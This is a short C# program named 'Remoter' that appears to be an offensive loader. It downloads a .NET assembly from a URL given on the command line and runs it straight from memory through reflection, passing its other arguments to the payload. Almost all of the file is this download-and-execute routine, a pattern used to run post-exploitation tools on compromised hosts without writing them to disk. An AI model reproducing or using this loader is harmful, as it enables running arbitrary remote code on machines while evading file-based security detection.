using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;

namespace Remoter
{
   class Program
    {
        static void Main(string[] args)
        {
            try
            {
                if (args[0] == "-w")
                {
                    object[] cmd = args.Skip(2).ToArray();
                    MemoryStream ms = new MemoryStream();
                    using (WebClient client = new WebClient())
                    {
                        System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
                        ms = new MemoryStream(client.DownloadData(args[1]));
                        BinaryReader br = new BinaryReader(ms);
                        byte[] bin = br.ReadBytes(Convert.ToInt32(ms.Length));
                        ms.Close();
                        br.Close();
                        loadAssembly(bin, cmd);
                    }
                }
            }
            catch
            {
                Console.WriteLine("There was an error executing the binary.");
            }
        }
        public static void loadAssembly(byte[] bin, object[] commands)
        {
            Assembly a = Assembly.Load(bin);
            try
            {
                a.EntryPoint.Invoke(null, new object[] { commands });
            }
            catch
            {
                MethodInfo method = a.EntryPoint;
                if (method != null)
                {
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
            }
        }
    }
}